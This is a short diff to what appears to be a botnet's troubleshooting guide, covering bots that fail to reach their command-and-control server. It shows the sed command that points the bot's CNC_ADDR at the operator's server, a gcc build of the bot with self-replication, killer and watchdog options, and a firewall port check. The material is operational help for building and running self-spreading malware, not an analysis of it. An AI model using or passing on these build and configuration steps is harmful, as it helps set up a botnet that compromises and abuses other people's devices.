@@ -250,12 +250,13 @@ PROBLEM: Bots won't connect to C&C
 SOLUTION:
   # Check CNC_ADDR in bot/config.h
   grep CNC_ADDR bot/config.h
-  
-  # Should be your server IP, not 127.0.0.1
-  
+
+  # Should be your server IP, not 0.0.0.0
+  # 0.0.0.0 is a placeholder - you MUST change it!
+
   # Rebuild bot with correct IP
   cd bot
-  sed -i 's/CNC_ADDR "127.0.0.1"/CNC_ADDR "YOUR_SERVER_IP"/' config.h
+  sed -i 's/CNC_ADDR "0.0.0.0"/CNC_ADDR "YOUR_SERVER_IP"/' config.h
   gcc -std=gnu99 -DKILLER -DSELFREP -DWATCHDOG -O3 -o ../bins/axis.x86_64 *.c
   
   # Check firewall allows port 3778
